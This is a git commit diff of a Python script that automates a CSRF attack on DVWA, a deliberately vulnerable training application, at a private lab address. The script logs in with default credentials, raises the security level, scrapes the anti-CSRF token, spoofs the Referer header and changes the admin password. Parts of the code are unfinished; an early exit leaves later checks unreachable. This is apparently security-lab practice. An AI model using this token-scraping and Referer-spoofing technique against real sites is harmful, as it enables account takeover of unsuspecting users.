10fe31bf9dc679ef82eacac7f60aff94a2aafacb
Christophe Cazin <christophe.cazin@gmail.com>
2019-02-28 18:01:39 +0100

    2_csrf_dvwa_medium high is working but need to be adapt a little bit \n Backup before modif

--- CSRF/2_csrf_dvwa_v1_10_medium.py
+++ CSRF/2_csrf_dvwa_v1_10_medium.py
@@ -19,35 +19,43 @@ HOST_DVWA='172.16.13.1:81'
 #HOST_DVWA='172.16.13.20/dvwa'
 URI_DVWA='http://{}'.format(HOST_DVWA)
 payload = {}
+cookie = {}
+
+# We declare s ( session ) object in global to use it in other functions
+
 
 # Function part
 print_ok = lambda x: cprint('# {} #'.format(x), 'green')
 print_ko = lambda x: cprint('# {} #'.format(x), 'red' )
+print_wh = lambda x: cprint('# {} #'.format(x), 'white' )
 
 
 def main():
+    # Create a session object to keep context in all requests
+    # We will instance all requests object from this one
+    global s
+    s = requests.session()
+    if get_attributes():
+        print_ok("get_attributes() done")
+        if login_dvwa():
+            if set_secu('high'):
+                csrf_medium()
+
+    else:
+        print_ko("get_attributes() done")
+        exit(0)
+'''
     if login_dvwa():
         if set_secu_medium():
             csrf_medium()
+'''
 
 
-
-# Log in to DVWA platform
-def login_dvwa():
-    # We declare s ( session ) object in global to use it in other functions
-    global s
-    # Loading dic payload to send data on forms
-    payload['password'] = 'password'
-    payload['username'] = 'admin'
-    payload['Login'] = 'Login'
-
-    WELCOME_BANNER='Welcome to Damn Vulnerable Web Application!'
+def get_attributes():
+    # Do a first GET to grab PHPSESSID and user_token
     url = '{}/login.php'.format(URI_DVWA)
 
-    # Create a session to keep all parameters between several requests
-    # Be careful, always work with this objects for all s.get and s.post to avoid to lost context
-    s = requests.session()
-    # Do a get just to take the hidden field in the log in page
+    # Do a get just to take the hidden field in the log in page and cookie
     r = s.get(url)
 
     # Parsing into the log in page to get the hidden token
@@ -57,39 +65,62 @@ def login_dvwa():
     if t:
         # Adding the token in paylod to inject in the post
         payload['user_token']=t['value']
-        p = s.post(url, data=payload)
-        if p.status_code == requests.codes.ok:
-            # We are successfully logged
-            if p.text.find(WELCOME_BANNER) != -1 :
-                print_ok('Logged in to DVWA {} - status code : {}'.format(url,r.status_code))
-                return True
-            else:
-                print_ko('Authentication error on DVWA {} - status code : {}'.format(r.url,r.status_code))
-                return None
+        print_wh('payload = {}'.format(payload))
 
+        # Adding too the Sessiom ID
+        # ['PHPSESSID=6vgc0cvb5o4c7b6kffmha2cfd6;', 'path=/,', 'PHPSESSID=6vgc0cvb5o4c7b6kffmha2cfd6;', 'path=/,', 'security=low']
+        cookie[r.headers['Set-Cookie'].split()[0].split('=')[0]]=r.headers['Set-Cookie'].split()[0].split('=')[1]
+        print_wh('cookie = {}'.format(cookie))
+        return True
     else:
-        print_ko('Error to log to DVWA urldvwalogin status code : {}'.format(r.status_code))
+        print_ko('Error to soup the attributes')
 
 
-def set_secu_medium():
-    SEC_BANNER = 'Security level set to medium'
-    payload['security'] = 'medium'
+# Log in to DVWA platform
+def login_dvwa():
+    # Loading dic payload to send data on forms
+    url = '{}/login.php'.format(URI_DVWA)
+
+    payload['password'] = 'password'
+    payload['username'] = 'admin'
+    payload['Login'] = 'Login'
+
+    WELCOME_BANNER='Welcome to Damn Vulnerable Web Application!'
+
+    r = s.post(url, data=payload, cookies=cookie)
+    if r.status_code == requests.codes.ok:
+        # We are successfully logged
+        if r.text.find(WELCOME_BANNER) != -1 :
+            print_ok('Logged in to DVWA {} - status code : {}'.format(url,r.status_code))
+            return True
+        else:
+            print_ko('Authentication error on DVWA {} - status code : {}'.format(r.url,r.status_code))
+
+
+
+def set_secu(level):
+    # Go to the DVWA Security menu and change level
+    SEC_BANNER = 'Security level set to {}'.format(level)
+    payload['security'] = level
     payload['seclev_submit'] = 'Submit'
     url = '{}/security.php'.format(URI_DVWA)
 
-    r = s.post(url, data=payload)
+    r = s.post(url, data=payload, cookies=cookie )
     if r.status_code == requests.codes.ok:
         soup = BeautifulSoup(r.text, 'html.parser')
         t = soup.find(attrs={'class': 'message'})
         if t.get_text() == SEC_BANNER:
-         print_ok('Security has been set to medium')
-         return True
+            print_ok('Security has been set to {}'.format(level))
+            return True
+        else:
+            print_ko('Level {} semms to be not available')
 
 def csrf_medium():
     CSRF_BANNER='Password Changed.'
     # url = '{}/vulnerabilities/csrf/index.php'.format(URI_DVWA)
     url = '{}/vulnerabilities/csrf/'.format(URI_DVWA)
-    new_password_csrf = '1234'
+    new_password_csrf = 'password'
+
     # Cleanup of not necessary values in the payload dict
     list_val = ('password', 'username', 'Login', 'security', 'seclev_submit')
     for val in list_val:
@@ -99,28 +130,44 @@ def csrf_medium():
     payload['password_conf'] = new_password_csrf
     payload['Change'] = 'Change'
 
-    # headers = {
-    #     'Referer' = ' '
-    # }
+    header = { 'Referer': '{}/vulnerabilities/csrf/'.format(URI_DVWA) }
 
     print('Inside csrf medium function')
+    #?password_new=5678&password_conf=5678&Change=Change
     #http://172.16.13.1:81/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
-    r = s.get(url, data=payload)
+
+
+    ###############################################
+    r = s.get(url, headers=header)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    t = soup.find(attrs={'name': 'user_token'})
+
+    print('Stored user_token : {}'.format(payload['user_token']))
+    print('new user_token : {}'.format(t['value']))
+    ###############################################
+
+    url = '{0}?password_new={1}&password_conf={1}&Change=Change'.format(url, new_password_csrf)
+    #   url for high level
+    url = '{0}&user_token={1}'.format(url,t['value'])
+    print('url : {}'.format(url))
+
+    r = s.get(url, headers= header)
     if r.status_code == requests.codes.ok:
         soup = BeautifulSoup(r.text, 'html.parser')
-        print(soup.find('pre'))
-        if soup.find('pre').contents[0] == CSRF_BANNER:
+        t = soup.find(attrs={'name': 'user_token'})
+        print('Stored user_token : {}'.format(payload['user_token']))
+        print('new user_token : {}'.format(t['value']))
+
+        exit(0)
+
+        t = soup.find('pre').contents[0]
+        if t.get_text()  == CSRF_BANNER:
             print_ok('Password has been changed successfully')
             return True
         else:
             print_ko('Password has not been changed')
-            return None
     # r = s.get(url)
     # print(r.text)
-    # headers = {
-    #     'Cookie': 'PHPSESSID=88airjn39jqo5mi25fnngko6f0; security=medium',
-    #     'Referer': 'http://172.16.13.1:81/vulnerabilities/csrf/'
-    # }
     # new_password = 'ac'
     # url = '%s?password_new=%s&password_conf=%s&Change=Change' % (url, new_password, new_password)
     # res = requests.get(url, headers=headers)
@@ -129,8 +176,5 @@ def csrf_medium():
     # else:
     #     print('No')
 
-
 if __name__ == '__main__':
     main()
-
-
